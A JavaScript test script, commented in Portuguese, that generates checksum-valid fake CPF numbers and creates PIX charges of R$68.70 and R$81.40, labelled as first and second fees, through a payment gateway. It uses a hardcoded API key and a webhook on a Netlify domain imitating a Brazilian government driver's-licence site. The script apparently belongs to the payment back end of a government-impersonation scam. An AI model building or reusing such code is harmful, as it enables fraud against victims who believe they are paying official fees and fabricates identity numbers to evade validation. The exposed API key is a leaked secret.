/**
 * Teste com CPF e dados válidos
 */

const AVEN_BASE = "https://api.avenpayments.com/v1/payment";
const AVEN_API_KEY = "2zxA50CzfpTMZgKCwuotYv681fsfo4bcrXrdttHxdD4";

// Gerar um CPF válido (como a função pix.js faz)
function gerarCpfValido() {
  const d = new Array(9);
  for (let i = 0; i < 9; i++) {
    d[i] = Math.floor(Math.random() * 10);
  }
  
  let soma = 0;
  for (let i = 0; i < 9; i++) {
    soma += d[i] * (10 - i);
  }
  let resto = soma % 11;
  d[9] = resto < 2 ? 0 : 11 - resto;
  
  soma = 0;
  for (let i = 0; i < 10; i++) {
    soma += d[i] * (11 - i);
  }
  resto = soma % 11;
  d[10] = resto < 2 ? 0 : 11 - resto;
  
  return d.join('');
}

async function testGateway(amount, description) {
  console.log(`\n📌 Testando com R$ ${amount} (${description})`);
  console.log("=" .repeat(70));

  const randId = Math.random().toString(36).slice(2, 10);
  const cpfValido = gerarCpfValido();
  
  const payload = {
    amount: Math.round(amount * 100),
    currency: "BRL",
    method: "PIX",
    description: description,
    externalRef: `order_${randId}`,
    notificationUrl: "https://cnh-brasil-gov-br.netlify.app/webhook/payment",
    payer: {
      name: "Teste Cliente",
      taxId: cpfValido,
      email: `teste${randId}@email.com`,
      phone: "5511999999999",
    },
    items: [{
      quantity: 1,
      name: description,
      price: Math.round(amount * 100),
      type: "DIGITAL",
    }],
  };

  console.log(`   CPF: ${cpfValido}`);
  console.log(`   Amount: R$ ${amount}`);
  console.log(`   External Ref: order_${randId}`);

  try {
    const response = await fetch(AVEN_BASE, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
        "Authorization": `Bearer ${AVEN_API_KEY}`
      },
      body: JSON.stringify(payload)
    });

    const text = await response.text();
    let data = {};
    
    try {
      data = JSON.parse(text);
    } catch (e) {
      console.log("❌ Parse error!");
      console.log(`   ${text.substring(0, 200)}`);
      return null;
    }

    if (response.ok && data.id) {
      console.log("✅ PIX GERADO NA GATEWAY!");
      console.log(`   Gateway ID: ${data.id}`);
      console.log(`   Status: ${data.status}`);
      console.log(`   Amount: R$ ${(data.amount / 100).toFixed(2)}`);
      console.log(`   Product: ${data.items?.[0]?.name || 'N/A'}`);
      
      if (data.data?.copypaste) {
        console.log(`   ✓ PIX Code gerado com sucesso`);
      }
      
      return data.id;
    } else {
      console.log("❌ ERRO ao gerar PIX!");
      console.log(`   Status: ${response.status}`);
      console.log(`   Mensagem: ${data.message || JSON.stringify(data).substring(0, 200)}`);
      return null;
    }
  } catch (err) {
    console.log(`❌ Erro: ${err.message}`);
    return null;
  }
}

async function runTests() {
  console.log("\n🎯 TESTE GATEWAY AVENPAYMENTS COM DADOS VÁLIDOS");
  console.log("=" .repeat(70));
  
  const id1 = await testGateway(68.70, "ECOM 02");
  await new Promise(resolve => setTimeout(resolve, 2000));
  
  const id2 = await testGateway(81.40, "ECOM 02");
  
  console.log("\n" + "=" .repeat(70));
  console.log("📊 RESULTADO FINAL");
  console.log("=" .repeat(70));
  
  if (id1) {
    console.log(`✅ Primeira Taxa (68.70): ${id1}`);
  } else {
    console.log(`❌ Primeira Taxa (68.70): FALHOU`);
  }
  
  if (id2) {
    console.log(`✅ Segunda Taxa (81.40): ${id2}`);
  } else {
    console.log(`❌ Segunda Taxa (81.40): FALHOU`);
  }
  
  if (id1 && id2) {
    console.log("\n🎉 TODOS OS PIXS GERARAM NA GATEWAY!");
  } else {
    console.log("\n⚠️  Verifique os dados da API key ou configuração");
  }
}

runTests();
